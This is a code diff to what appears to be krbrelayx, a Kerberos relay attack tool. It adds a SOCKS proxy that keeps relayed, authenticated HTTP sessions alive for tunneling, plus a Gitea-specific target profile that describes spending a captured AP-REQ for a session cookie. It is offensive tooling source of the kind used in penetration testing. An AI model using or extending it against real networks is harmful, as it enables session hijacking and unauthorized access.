@@ -41,12 +41,14 @@ import argparse
 import sys
 import binascii
 import logging
+from threading import Thread
 
 from impacket.examples import logger
 from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor, TargetsFileWatcher
 
 from lib.servers import SMBRelayServer, HTTPKrbRelayServer, DNSRelayServer
+from lib.servers.socksserver import KrbSOCKS
 from lib.utils.config import KrbRelayxConfig
 
 RELAY_SERVERS = ( SMBRelayServer, HTTPKrbRelayServer, DNSRelayServer )
@@ -91,6 +93,9 @@ def main():
             c.setKrbOptions(options.format, options.victim)
             c.setIsADCSAttack(options.adcs)
             c.setADCSOptions(options.template)
+            c.setSocksOptions(options.socks, options.socks_address, options.socks_port,
+                              options.socks_api_port, socks_profile,
+                              options.socks_login_path)
 
             #If the redirect option is set, configure the HTTP server to redirect targets to SMB
             if server is HTTPKrbRelayServer and options.r is not None:
@@ -142,6 +147,35 @@ def main():
     parser.add_argument('-wa', '--wpad-auth-num', action='store', help='Prompt for authentication N times for clients without MS16-077 installed '
                                                                        'before serving a WPAD file.')
     parser.add_argument('-6', '--ipv6', action='store_true', help='Listen on both IPv6 and IPv4')
+
+    # SOCKS proxy arguments
+    socksopts = parser.add_argument_group("SOCKS proxy options")
+    socksopts.add_argument('-socks', action='store_true', default=False,
+                           help='Launch a SOCKS4/5 proxy that keeps relayed Kerberos HTTP sessions '
+                                'open and tunnels browser traffic through them. Generic mode by '
+                                'default; pair with -gitea (or another target profile) for '
+                                'app-specific routing. While -socks is set, -c and -e are ignored '
+                                'for HTTP/HTTPS targets.')
+    socksopts.add_argument('-socks-address', action='store', default='127.0.0.1', metavar='ADDRESS',
+                           help='Address to bind the SOCKS proxy to (default: 127.0.0.1).')
+    socksopts.add_argument('-socks-port', action='store', type=int, default=1080, metavar='PORT',
+                           help='Port to bind the SOCKS proxy to (default: 1080).')
+    socksopts.add_argument('-socks-api-port', action='store', type=int, default=9090, metavar='PORT',
+                           help='Reserved port for a future REST API (default: 9090).')
+    socksopts.add_argument('-socks-login-path', action='store', default=None, metavar='PATH',
+                           help='Override the active profile\'s pre-auth login path. The AP-REQ is '
+                                'spent once against this path at relay setup in exchange for a '
+                                'session cookie. Empty string disables the pre-auth probe and '
+                                'replays the AP-REQ on every tunneled request (only safe against '
+                                'non-Windows targets).')
+
+    # Target-specific profile flags.
+    targetopts = parser.add_argument_group("Target profile options")
+    targetopts.add_argument('-gitea', action='store_true', default=False,
+                            help='Tune the SOCKS proxy for a Gitea target with the SSPI auth source '
+                                 'enabled. Adds the Gitea SSPI login URL, suppresses the websspi '
+                                 'cookie on tunneled requests, stubs Gitea\'s SSE endpoints, and '
+                                 'extends the static-asset bypass list. Implies -socks.')
 
     # Authentication arguments
     group = parser.add_argument_group('Kerberos Keys (of your account with unconstrained delegation)')
@@ -224,6 +258,13 @@ def main():
             targetSystem = None
             mode = 'EXPORT'
 
+    socks_profile = 'generic'
+    if options.gitea:
+        socks_profile = 'gitea'
+        if not options.socks:
+            logging.info('-gitea set, enabling -socks automatically')
+            options.socks = True
+
     if not options.krbpass and not options.krbhexpass and not options.hashes and not options.aesKey:
         logging.info("Running in kerberos relay mode because no credentials were specified.")
         if mode == 'EXPORT':
@@ -241,6 +282,23 @@ def main():
         watchthread.start()
 
     threads = set()
+    socksServer = None
+
+    if options.socks:
+        if mode == 'EXPORT':
+            logging.error('-socks requires at least one target (-t/-tf); export mode has nothing to keep alive.')
+            return
+        if options.c or options.e:
+            logging.warning('-socks is set: -c/-e command execution is suppressed for HTTP targets.')
+        try:
+            socksServer = KrbSOCKS((options.socks_address, options.socks_port))
+        except OSError as e:
+            logging.error('Could not bind SOCKS proxy on %s:%d: %s', options.socks_address, options.socks_port, e)
+            return
+        socks_thread = Thread(target=socksServer.serve_forever)
+        socks_thread.daemon = True
+        socks_thread.start()
+        threads.add(socks_thread)
 
     c = start_servers(options, threads)
 
@@ -252,6 +310,13 @@ def main():
         pass
     else:
         pass
+
+    if socksServer is not None:
+        try:
+            socksServer.shutdown()
+            socksServer.server_close()
+        except Exception:
+            pass
 
     for s in threads:
         del s
